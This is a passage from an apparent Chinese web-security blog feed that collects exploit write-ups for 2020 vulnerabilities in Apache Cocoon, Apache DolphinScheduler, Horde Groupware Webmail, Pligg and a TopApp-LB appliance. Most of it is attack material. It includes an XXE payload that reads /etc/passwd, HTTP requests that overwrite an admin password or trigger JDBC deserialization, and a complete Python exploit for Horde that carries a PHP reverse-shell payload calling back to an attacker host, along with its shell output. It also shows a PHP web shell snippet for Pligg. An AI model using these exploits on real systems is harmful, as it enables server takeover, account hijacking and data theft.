<p>1、漏洞利用条件有限必须是apacheCocoon且使用了StreamGenerator,也就是说只要传输的数据被解析就可以实现了。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--?xml version=&quot;1.0&quot; ?--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">replace</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">ent</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">userInfo</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">firstName</span>&gt;</span>John<span class="tag">&lt;/<span class="name">firstName</span>&gt;</span> </span><br><span class="line">	<span class="tag">&lt;<span class="name">lastName</span>&gt;</span><span class="symbol">&amp;ent;</span><span class="tag">&lt;/<span class="name">lastName</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">userInfo</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200914145811723.png" alt="image-20200914145811723"></p>
<p>参考链接：<a href="http://mail-archives.apache.org/mod_mbox/cocoon-users/202009.mbox/author">http://mail-archives.apache.org/mod_mbox/cocoon-users/202009.mbox/author</a></p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>Apache-Cocoon-XML</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache DolphinScheduler权限覆盖漏洞(CVE-2020-13922)</title>
    <url>/2020/09/17/WEB/Exploit/Apache-DolphinScheduler%E6%9D%83%E9%99%90%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E-CVE-2020-13922/</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>发现的漏洞是任何租户下的普通用户都可以通过以下方式覆盖其他用户的密码<br>api interface /dolphinscheduler/users/update</p>
<h2 id="受影响的版本"><a href="#受影响的版本" class="headerlink" title="受影响的版本"></a>受影响的版本</h2><p>受影响版本<br>Apache DolphinScheduler = 1.2.0、1.2.1、1.3.1</p>
<p>安全版本<br>Apache DolphinScheduler &gt;= 1.3.2</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917165719031.png" alt="image-20200917165719031"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;dolphinscheduler&#x2F;users&#x2F;update</span><br><span class="line">userName&#x3D;admin&amp;userPassword&#x3D;Password1!&amp;tenantId&#x3D;1&amp;email&#x3D;sdluser%40sdluser.sdluser&amp;phone&#x3D;&amp;id&#x3D;1</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917170117506.png" alt="image-20200917170117506"></p>
<h2 id="漏洞修复方案"><a href="#漏洞修复方案" class="headerlink" title="漏洞修复方案"></a>漏洞修复方案</h2><p>建议用户将 Apache DolphinScheduler 升级到安全版本。</p>
<p>下载链接：<a href="https://dolphinscheduler.apache.org/zh-cn/docs/release/download.html">https://dolphinscheduler.apache.org/zh-cn/docs/release/download.html</a></p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>Apache</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache DolphinScheduler远程代码执行(CVE-2020-11974)</title>
    <url>/2020/09/17/WEB/Exploit/Apache-DolphinScheduler%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2020-11974/</url>
    <content><![CDATA[<h2 id="Apache-DolphinScheduler组件介绍"><a href="#Apache-DolphinScheduler组件介绍" class="headerlink" title="Apache DolphinScheduler组件介绍"></a>Apache DolphinScheduler组件介绍</h2><p>​    Apache DolphinScheduler(incubator,原EasyScheduler）是一个分布式工作流任务调度系统，主要解决数据研发ETL错综复杂的依赖关系，不能直观监控任务健康状态。DolphinScheduler以DAG流式的方式将Task组装起来，可实时监控任务的运行状态，同时支持重试、从指定节点恢复失败、暂停及Kill任务等操作。</p>
<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>​    CVE-2020-11974与mysql connectorj远程执行代码漏洞有关，在选择mysql作为数据库时，攻击者可通过jdbc connect参数输入{“detectCustomCollations”:true，“autoDeserialize”:true} 在DolphinScheduler 服务器上远程执行代码。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>受影响版本<br>Apache DolphinScheduler = 1.2.0、1.2.1</p>
<p>安全版本<br>Apache DolphinScheduler &gt;= 1.3.1</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>需要登陆权限</p>
<p>该漏洞存在于数据源中心未限制添加的jdbc连接参数,从而实现JDBC客户端反序列化。</p>
<p>1、登录到面板 -&gt; 数据源中心。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917170923674.png" alt="image-20200917170923674"></p>
<p>2、jdbc连接参数就是主角,这里没有限制任意类型的连接串参数。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917170947012.png" alt="image-20200917170947012"></p>
<p>3、将以下数据添加到jdbc连接参数中,就可以直接触发。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917171000453.png" alt="image-20200917171000453"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;dolphinscheduler&#x2F;datasources&#x2F;connect HTTP&#x2F;1.1</span><br><span class="line"></span><br><span class="line">type&#x3D;MYSQL&amp;name&#x3D;test&amp;note&#x3D;&amp;host&#x3D;127.0.0.1&amp;port&#x3D;3306&amp;database&#x3D;test&amp;</span><br><span class="line">principal&#x3D;&amp;userName&#x3D;root&amp;password&#x3D;root&amp;connectType&#x3D;&amp;</span><br><span class="line">other&#x3D;&#123;&quot;detectCustomCollations&quot;:true,&quot;autoDeserialize&quot;:true&#125;</span><br></pre></td></tr></table></figure>



<p>关于MySQL JDBC客户端反序列化漏洞的相关参考：</p>
<p><a href="https://www.anquanke.com/post/id/203086">https://www.anquanke.com/post/id/203086</a></p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>Apache</tag>
      </tags>
  </entry>
  <entry>
    <title>Horde Groupware Webmail Edition 远程命令执行</title>
    <url>/2020/09/14/WEB/Exploit/Horde-Groupware-Webmail-Edition-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<p>Python Exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Horde Groupware Webmail Edition Sort sortpref Deserialization of Untrusted Data Remote Code Execution Vulnerability</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Identifiers: ZDI-CAN-10436 / ZDI-20-1051</span></span><br><span class="line"><span class="string">Found by ..: mr_me</span></span><br><span class="line"><span class="string">Tested on .: Horde Groupware Webmail 5.2.22 (pear installation) on Debian 9 Stretch w/ Apache/2.4.25 &amp; PHP 7.0.33</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Summary:</span></span><br><span class="line"><span class="string">========</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">It&#x27;s possible to reach a deserialization of untrusted data vulnerability within the constructor of the IMP_Prefs_Sort class. A low privileged authenticated attacker can leverage this to achieve remote code execution.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Example:</span></span><br><span class="line"><span class="string">========</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">saturn:~ mr_me$ ./poc.py </span></span><br><span class="line"><span class="string">(+) usage ./poc.py &lt;target&gt; &lt;path&gt; &lt;user:pass&gt; &lt;connectback:port&gt;</span></span><br><span class="line"><span class="string">(+) eg: ./poc.py 172.16.175.148 /horde/ hordeuser:pass123 172.16.175.1:1337</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">saturn:~ mr_me$ ./poc.py 172.16.175.148 /horde/ hordeuser:pass123 172.16.175.1:1337</span></span><br><span class="line"><span class="string">(+) targeting http://172.16.175.145/horde/</span></span><br><span class="line"><span class="string">(+) obtained session iefankvohbl8og0mtaadm3efb6</span></span><br><span class="line"><span class="string">(+) inserted our php object</span></span><br><span class="line"><span class="string">(+) triggering deserialization...</span></span><br><span class="line"><span class="string">(+) starting handler on port 1337</span></span><br><span class="line"><span class="string">(+) connection from 172.16.175.145</span></span><br><span class="line"><span class="string">(+) pop thy shell!</span></span><br><span class="line"><span class="string">id</span></span><br><span class="line"><span class="string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br><span class="line"><span class="string">pwd</span></span><br><span class="line"><span class="string">/var/www/horde/services</span></span><br><span class="line"><span class="string">uname -a</span></span><br><span class="line"><span class="string">Linux target 4.9.0-11-amd64 #1 SMP Debian 4.9.189-3+deb9u1 (2019-09-20) x86_64 GNU/Linux</span></span><br><span class="line"><span class="string">exit</span></span><br><span class="line"><span class="string">*** Connection closed by remote host ***</span></span><br><span class="line"><span class="string">(+) repaired the target!</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> telnetlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rs</span>(<span class="params">cbh, cbp</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;&quot;@error_reporting(-1);</span></span><br><span class="line"><span class="string">@set_time_limit(0); </span></span><br><span class="line"><span class="string">@ignore_user_abort(1);</span></span><br><span class="line"><span class="string">$dis=@ini_get(&#x27;disable_functions&#x27;);</span></span><br><span class="line"><span class="string">if(!empty($dis))&#123;</span></span><br><span class="line"><span class="string">    $dis=preg_replace(&#x27;/[, ]+/&#x27;, &#x27;,&#x27;, $dis);</span></span><br><span class="line"><span class="string">    $dis=explode(&#x27;,&#x27;, $dis);</span></span><br><span class="line"><span class="string">    $dis=array_map(&#x27;trim&#x27;, $dis);</span></span><br><span class="line"><span class="string">&#125;else&#123;</span></span><br><span class="line"><span class="string">    $dis=array();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">$ipaddr=&#x27;%s&#x27;;</span></span><br><span class="line"><span class="string">$port=%d;</span></span><br><span class="line"><span class="string">function PtdSlhY($c)&#123;</span></span><br><span class="line"><span class="string">    global $dis; </span></span><br><span class="line"><span class="string">    if (FALSE !== strpos(strtolower(PHP_OS), &#x27;win&#x27; )) &#123;</span></span><br><span class="line"><span class="string">        $c=$c.&quot; 2&gt;&amp;1\\n&quot;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    ob_start();</span></span><br><span class="line"><span class="string">    system($c);</span></span><br><span class="line"><span class="string">    $o=ob_get_contents();</span></span><br><span class="line"><span class="string">    ob_end_clean();</span></span><br><span class="line"><span class="string">    if (strlen($o) === 0)&#123;</span></span><br><span class="line"><span class="string">        $o = &quot;NULL&quot;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    return $o;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">$nofuncs=&#x27;no exec functions&#x27;;</span></span><br><span class="line"><span class="string">$s=@fsockopen(&quot;tcp://$ipaddr&quot;,$port);</span></span><br><span class="line"><span class="string">while($c=fread($s,2048))&#123;</span></span><br><span class="line"><span class="string">    $out = &#x27;&#x27;;</span></span><br><span class="line"><span class="string">    if(substr($c,0,3) == &#x27;cd &#x27;)&#123;</span></span><br><span class="line"><span class="string">        chdir(substr($c,3,-1));</span></span><br><span class="line"><span class="string">    &#125;else if (substr($c,0,4) == &#x27;quit&#x27; || substr($c,0,4) == &#x27;exit&#x27;) &#123;</span></span><br><span class="line"><span class="string">        break;</span></span><br><span class="line"><span class="string">    &#125;else&#123;</span></span><br><span class="line"><span class="string">        $out=PtdSlhY(substr($c,0,-1));</span></span><br><span class="line"><span class="string">        if($out===false)&#123;</span></span><br><span class="line"><span class="string">            fwrite($s, $nofuncs);</span></span><br><span class="line"><span class="string">            break;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    fwrite($s,$out);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">fclose($s);&quot;&quot;&quot;</span> % (cbh, cbp)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_session</span>(<span class="params">t, p, usr, pwd</span>):</span></span><br><span class="line">    uri = <span class="string">&quot;http://%s%slogin.php&quot;</span> % (t, p)</span><br><span class="line">    p = &#123;</span><br><span class="line">        <span class="string">&quot;login_post&quot;</span> : <span class="number">1337</span>,</span><br><span class="line">        <span class="string">&quot;horde_user&quot;</span> : usr,</span><br><span class="line">        <span class="string">&quot;horde_pass&quot;</span> : pwd</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(uri, data=p, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    match = re.findall(<span class="string">&quot;Horde=(.&#123;26&#125;);&quot;</span>, r.headers[<span class="string">&#x27;set-cookie&#x27;</span>])</span><br><span class="line">    <span class="keyword">assert</span> len(match) == <span class="number">2</span>, <span class="string">&quot;(-) failed to login&quot;</span></span><br><span class="line">    <span class="keyword">return</span> match[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_deserialization</span>(<span class="params">t, p, s, host, port</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; Object instantiation to reach the deserialization &quot;&quot;&quot;</span></span><br><span class="line">    handlerthr = Thread(target=handler, args=(port,))</span><br><span class="line">    handlerthr.start()</span><br><span class="line">    uri = <span class="string">&quot;http://%s%sservices/ajax.php/imp/imple&quot;</span> % (t, p)</span><br><span class="line">    p = &#123;</span><br><span class="line">        <span class="string">&quot;imple&quot;</span> : <span class="string">&quot;IMP_Prefs_Sort&quot;</span>,</span><br><span class="line">        <span class="string">&quot;app&quot;</span> : <span class="string">&quot;imp&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    h = &#123; <span class="string">&quot;cmd&quot;</span> : base64.b64encode(rs(host, port).encode()) &#125;</span><br><span class="line">    c = &#123; <span class="string">&quot;Horde&quot;</span> : s &#125;</span><br><span class="line">    r = requests.get(uri, params=p, cookies=c, headers=h)</span><br><span class="line">    match = re.search(<span class="string">&quot;horde_logout_token=(.*)&amp;&quot;</span>, r.text)</span><br><span class="line">    <span class="keyword">assert</span> match, <span class="string">&quot;(-) failed to leak the horde_logout_token!&quot;</span></span><br><span class="line">    p[<span class="string">&#x27;token&#x27;</span>] = match.group(<span class="number">1</span>)</span><br><span class="line">    r = requests.get(uri, params=p, cookies=c, headers=h)</span><br><span class="line">    <span class="keyword">assert</span> r.status_code == <span class="number">200</span>, <span class="string">&quot;(-) failed to trigger deserialization!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pop</span>():</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; An updated pop chain &quot;&quot;&quot;</span></span><br><span class="line">    pop  = <span class="string">&#x27;O:34:&quot;Horde_Kolab_Server_Decorator_Clean&quot;:2:&#123;&#x27;</span></span><br><span class="line">    pop += <span class="string">&#x27;S:43:&quot;\\00Horde_Kolab_Server_Decorator_Clean\\00_server&quot;;O:20:&quot;Horde_Prefs_Identity&quot;:3:&#123;&#x27;</span></span><br><span class="line">    pop += <span class="string">&#x27;S:9:&quot;\\00*\\00_prefs&quot;;O:11:&quot;Horde_Prefs&quot;:2:&#123;&#x27;</span></span><br><span class="line">    pop += <span class="string">&#x27;S:8:&quot;\\00*\\00_opts&quot;;a:1:&#123;&#x27;</span></span><br><span class="line">    pop += <span class="string">&#x27;s:12:&quot;sizecallback&quot;;a:2:&#123;i:0;O:12:&quot;Horde_Config&quot;:1:&#123;&#x27;</span></span><br><span class="line">    pop += <span class="string">&#x27;S:13:&quot;\\00*\\00_oldConfig&quot;;s:44:&quot;eval(base64_decode($_SERVER[HTTP_CMD]));die;&quot;;&#x27;</span></span><br><span class="line">    pop += <span class="string">&#x27;&#125;i:1;s:13:&quot;readXMLConfig&quot;;&#125;&#125;&#x27;</span></span><br><span class="line">    pop += <span class="string">&#x27;S:10:&quot;\\00*\\00_scopes&quot;;a:1:&#123;&#x27;</span></span><br><span class="line">    pop += <span class="string">&#x27;s:5:&quot;horde&quot;;C:17:&quot;Horde_Prefs_Scope&quot;:10:&#123;[null,[1]]&#125;&#125;&#125;&#x27;</span>  <span class="comment"># implements Serializable using custom unserialize/serialize</span></span><br><span class="line">    pop += <span class="string">&#x27;S:13:&quot;\\00*\\00_prefnames&quot;;a:1:&#123;s:10:&quot;identities&quot;;i:0;&#125;&#x27;</span></span><br><span class="line">    pop += <span class="string">&#x27;S:14:&quot;\\00*\\00_identities&quot;;a:1:&#123;i:0;i:0;&#125;&#125;&#x27;</span>             <span class="comment"># additional checks</span></span><br><span class="line">    pop += <span class="string">&#x27;S:42:&quot;\\00Horde_Kolab_Server_Decorator_Clean\\00_added&quot;;a:1:&#123;i:0;i:0;&#125;&#125;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> pop</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_patch</span>():</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; Our original array &quot;&quot;&quot;</span></span><br><span class="line">    patch  = <span class="string">&#x27;a:1:&#123;&#x27;</span></span><br><span class="line">    patch += <span class="string">&#x27;s:5:&quot;INBOX&quot;;a:1:&#123;&#x27;</span></span><br><span class="line">    patch += <span class="string">&#x27;s:1:&quot;b&quot;;i:6;&#x27;</span></span><br><span class="line">    patch += <span class="string">&#x27;&#125;&#125;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> patch</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_pref</span>(<span class="params">t, p, s, k, o</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; A primitive that inserts a string into the database &quot;&quot;&quot;</span></span><br><span class="line">    uri = <span class="string">&quot;http://%s%sservices/ajax.php/imp/setPrefValue&quot;</span> % (t, p)</span><br><span class="line">    p = &#123;</span><br><span class="line">        <span class="string">&quot;pref&quot;</span> : k,</span><br><span class="line">        <span class="string">&quot;value&quot;</span> : o,</span><br><span class="line">    &#125;</span><br><span class="line">    c = &#123; <span class="string">&quot;Horde&quot;</span> : s &#125;</span><br><span class="line">    r = requests.get(uri, params=p, cookies=c)</span><br><span class="line">    match = re.search(<span class="string">&quot;horde_logout_token=(.*)&amp;&quot;</span>, r.text)</span><br><span class="line">    <span class="keyword">assert</span> match, <span class="string">&quot;(-) failed to leak the horde_logout_token!&quot;</span></span><br><span class="line">    p[<span class="string">&#x27;token&#x27;</span>] = match.group(<span class="number">1</span>)</span><br><span class="line">    r = requests.get(uri, params=p, cookies=c)</span><br><span class="line">    <span class="keyword">assert</span> (<span class="string">&quot;\&quot;response\&quot;:true&quot;</span> <span class="keyword">in</span> r.text <span class="keyword">and</span> r.status_code == <span class="number">200</span>), <span class="string">&quot;(-) failed to set the preference!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handler</span>(<span class="params">lport</span>):</span></span><br><span class="line">    print(<span class="string">&quot;(+) starting handler on port %d&quot;</span> % lport)</span><br><span class="line">    t = telnetlib.Telnet()</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.bind((<span class="string">&quot;0.0.0.0&quot;</span>, lport))</span><br><span class="line">    s.listen(<span class="number">1</span>)</span><br><span class="line">    conn, addr = s.accept()</span><br><span class="line">    print(<span class="string">&quot;(+) connection from %s&quot;</span> % addr[<span class="number">0</span>])</span><br><span class="line">    t.sock = conn</span><br><span class="line">    print(<span class="string">&quot;(+) pop thy shell!&quot;</span>)</span><br><span class="line">    t.interact()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fix_path</span>(<span class="params">p</span>):</span></span><br><span class="line">    <span class="keyword">if</span> p == <span class="string">&quot;/&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> p</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> p.startswith(<span class="string">&quot;/&quot;</span>):</span><br><span class="line">        p = <span class="string">&quot;/%s&quot;</span> % p</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> p.endswith(<span class="string">&quot;/&quot;</span>):</span><br><span class="line">        p = <span class="string">&quot;%s/&quot;</span> % p</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">5</span>:</span><br><span class="line">        print(<span class="string">&quot;(+) usage %s &lt;target&gt; &lt;path&gt; &lt;user:pass&gt; &lt;connectback:port&gt;&quot;</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">        print(<span class="string">&quot;(+) eg: %s 172.16.175.148 /horde/ hordeuser:pass123 172.16.175.1:1337&quot;</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    target = sys.argv[<span class="number">1</span>]</span><br><span class="line">    path   = fix_path(sys.argv[<span class="number">2</span>])</span><br><span class="line">    user   = sys.argv[<span class="number">3</span>].split(<span class="string">&quot;:&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">    pswd   = sys.argv[<span class="number">3</span>].split(<span class="string">&quot;:&quot;</span>)[<span class="number">1</span>]</span><br><span class="line">    host   = sys.argv[<span class="number">4</span>].split(<span class="string">&quot;:&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">    port   = int(sys.argv[<span class="number">4</span>].split(<span class="string">&quot;:&quot;</span>)[<span class="number">1</span>])</span><br><span class="line">    print(<span class="string">&quot;(+) targeting http://%s%s&quot;</span> % (target, path))</span><br><span class="line">    session = get_session(target, path, user, pswd)</span><br><span class="line">    print(<span class="string">&quot;(+) obtained session %s&quot;</span> % session)</span><br><span class="line">    set_pref(target, path, session, <span class="string">&#x27;sortpref&#x27;</span>, get_pop())</span><br><span class="line">    print(<span class="string">&quot;(+) inserted our php object&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;(+) triggering deserialization...&quot;</span>)</span><br><span class="line">    trigger_deserialization(target, path, session, host, port)</span><br><span class="line">    set_pref(target, path, session, <span class="string">&#x27;sortpref&#x27;</span>, get_patch())</span><br><span class="line">    print(<span class="string">&quot;(+) repaired the target!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">saturn:~$.&#x2F;poc.py 172.16.175.148&#x2F;horde&#x2F; hordeuser:pass123 172.16.175.145</span><br><span class="line"></span><br><span class="line">(+) targeting http:&#x2F;&#x2F;172.16.175.145&#x2F;horde&#x2F;</span><br><span class="line"></span><br><span class="line">(+) obtained session iefankvohbl8og0mtaadm3efb6</span><br><span class="line"></span><br><span class="line">(+) inserted our php object</span><br><span class="line"></span><br><span class="line">(+) triggering deserialization...</span><br><span class="line"></span><br><span class="line">(+) starting handler on port 1337</span><br><span class="line"></span><br><span class="line">(+) connection from 172.16.175.145</span><br><span class="line"></span><br><span class="line">(+) pop thy shell!</span><br><span class="line"></span><br><span class="line">id</span><br><span class="line"></span><br><span class="line">uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data)</span><br><span class="line"></span><br><span class="line">pwd</span><br><span class="line"></span><br><span class="line">&#x2F;var&#x2F;www&#x2F;horde&#x2F;services</span><br></pre></td></tr></table></figure>

<p>参考链接：<a href="https://srcincite.io/pocs/zdi-20-1051.py.txt">https://srcincite.io/pocs/zdi-20-1051.py.txt</a></p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>Horde Groupware Webmail Edition</tag>
      </tags>
  </entry>
  <entry>
    <title>Pligg远程命令执行(CVE-2020-25287)</title>
    <url>/2020/09/17/WEB/Exploit/Pligg%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-CVE-2020-25287/</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p><code>the_file</code>由于无需检查扩展名，我们可以通过模板编辑器菜单使用参数来访问任何文件，然后将webshell创建到现有的php文件中</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Pligg2.0.3版本</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917174643966.png" alt="image-20200917174643966"></p>
<p>转到<code>/admin/admin_editor.php</code>拦截请求并将路径更改为文件。</p>
<p>例如得到<code>index.php</code>申请：<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917174701957.png" alt="image-20200917174701957"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;admin&#x2F;admin_editor.php HTTP&#x2F;1.1</span><br><span class="line">Host: kliqqi</span><br><span class="line">Content-Length: 33</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http:&#x2F;&#x2F;kliqqi</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;85.0.4183.102 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;kliqqi&#x2F;admin&#x2F;admin_editor.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: fr-FR,fr;q&#x3D;0.9,en-US;q&#x3D;0.8,en;q&#x3D;0.7</span><br><span class="line">Cookie: panelState&#x3D;CollapseManage%7CCollapseSettings%7CCollapseTemplate; PHPSESSID&#x3D;lfkc3gtrv5o1golmt5md3; mnm_user&#x3D;Admin; mnm_key&#x3D;QWRtaW46MjI0R2dEVTAxZncxZzpl</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">the_file&#x3D;..%2Findex.php&amp;open&#x3D;Open</span><br></pre></td></tr></table></figure>

<p>模版编辑器功能可以编辑任意文件内容,在文件中加入恶意代码导致代码执行。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917174734515.png" alt="image-20200917174734515"></p>
<p>比如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  if($_GET[&#39;cmd&#39;])&#123;</span><br><span class="line">    system($_GET[&#39;cmd&#39;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>访问<code>website.fr?cmd=dir</code></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917174826813.png" alt="image-20200917174826813"></p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>Pligg</tag>
      </tags>
  </entry>
  <entry>
    <title>天融信TopApp-LB 负载均衡系统Sql注入漏洞</title>
    <url>/2020/09/13/WEB/Exploit/%E5%A4%A9%E8%9E%8D%E4%BF%A1TopApp-LB-%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%B3%BB%E7%BB%9FSql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200913015312879.png" alt="image-20200913015312879"></p>
